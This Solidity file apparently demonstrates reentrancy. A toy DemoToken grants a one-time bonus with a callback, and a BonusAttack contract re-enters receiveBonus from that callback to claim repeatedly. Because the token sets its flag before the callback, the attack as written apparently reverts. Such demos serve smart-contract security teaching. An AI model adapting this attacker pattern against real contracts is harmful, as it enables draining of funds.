// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IDemoTokenReceiver {
    function onBonusReceived() external returns (bytes4);
}

error BonusAlreadyReceived();
error NonBonusReceiver();

contract DemoToken {
    uint256 public constant BONUS_AMOUNT = 10;

    mapping(address owner => uint256 amount) public balances;
    mapping(address owner => bool) public hasReceivedBonus;

    modifier notReceivedBonus() {
        if (hasReceivedBonus[msg.sender]) {
            revert BonusAlreadyReceived();
        }

        _;
    }

    // modifier checkReceiveBonus() {
    //     if (IDemoTokenReceiver(msg.sender).onBonusReceived() != IDemoTokenReceiver.onBonusReceived.selector) {
    //         revert NonBonusReceiver();
    //     }

    //     _;
    // }

    function receiveBonus() external notReceivedBonus {
        hasReceivedBonus[msg.sender] = true;
        balances[msg.sender] += BONUS_AMOUNT;

        if (IDemoTokenReceiver(msg.sender).onBonusReceived() != IDemoTokenReceiver.onBonusReceived.selector) {
            revert NonBonusReceiver();
        }
    }
}

contract BonusAttack is IDemoTokenReceiver {
    DemoToken public immutable tokenToAttack;

    uint256 public receiveTotal;
    uint256 public receivedCount = 1;

    constructor(address _token, uint256 _receiveTotal) {
        tokenToAttack = DemoToken(_token);
        receiveTotal = _receiveTotal;
    }

    function onBonusReceived() external returns (bytes4) {
        if (receivedCount < receiveTotal) {
            ++receivedCount;

            tokenToAttack.receiveBonus();
        }

        return IDemoTokenReceiver.onBonusReceived.selector;
    }

    function attack() external {
        tokenToAttack.receiveBonus();
    }
}